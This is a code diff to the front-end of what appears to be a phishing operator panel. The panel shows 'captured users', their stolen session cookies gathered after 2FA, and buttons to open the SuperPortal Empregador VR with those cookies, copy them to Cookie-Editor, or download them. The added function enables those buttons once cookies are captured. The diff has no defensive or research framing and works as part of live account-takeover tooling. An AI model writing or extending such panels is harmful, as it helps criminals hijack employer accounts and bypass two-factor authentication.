@@ -760,6 +760,21 @@
       });
     }
 
+    function atualizarBotoesAcaoSessao(temCookies) {
+      if (btnAbrirPortal) {
+        btnAbrirPortal.style.pointerEvents = temCookies ? "" : "none";
+        btnAbrirPortal.style.opacity = temCookies ? "1" : "0.5";
+        btnAbrirPortal.title = temCookies ? "Abrir SuperPortal Empregador VR" : "Operação indisponível: Nenhum cookie capturado";
+      }
+      [btnCopiarCookieEditor, btnBaixarJson, btnBaixarTxt].forEach(b => {
+        if (b) {
+          b.disabled = !temCookies;
+          b.style.opacity = temCookies ? "1" : "0.5";
+          b.style.cursor = temCookies ? "pointer" : "not-allowed";
+        }
+      });
+    }
+
     async function carregarSessao() {
       if (!usuarioParam) {
         subUsuario.textContent = "Aguardando seleção de um usuário capturado acima...";
@@ -768,6 +783,7 @@
         kpiCookies.textContent = "0";
         tbodyCookies.innerHTML = `<tr><td colspan="8" style="text-align:center; padding:32px; color:var(--text-muted);">Nenhum usuário selecionado. Escolha um usuário capturado no seletor acima para visualizar seus cookies.</td></tr>`;
         totalLinhasCookies.textContent = "0 itens";
+        atualizarBotoesAcaoSessao(false);
         return;
       }
       try {
@@ -796,12 +812,15 @@
         urlDestinoBadge.textContent = urlDest.length > 55 ? urlDest.slice(0, 52) + "..." : urlDest;
         urlDestinoBadge.title = urlDest;
 
+        const temCookies = Array.isArray(data.cookies) && data.cookies.length > 0;
+        atualizarBotoesAcaoSessao(temCookies);
         renderizarCookies(data.cookies || []);
 
       } catch (err) {
         console.error("Erro ao carregar sessão:", err);
         subUsuario.textContent = `Sessão não encontrada para: ${usuarioParam}`;
         tbodyCookies.innerHTML = `<tr><td colspan="8" style="text-align:center; padding:32px; color:var(--danger);">Sessão de cookies ainda não foi finalizada para este usuário. Aguarde a validação do 2FA.</td></tr>`;
+        atualizarBotoesAcaoSessao(false);
       }
     }
 
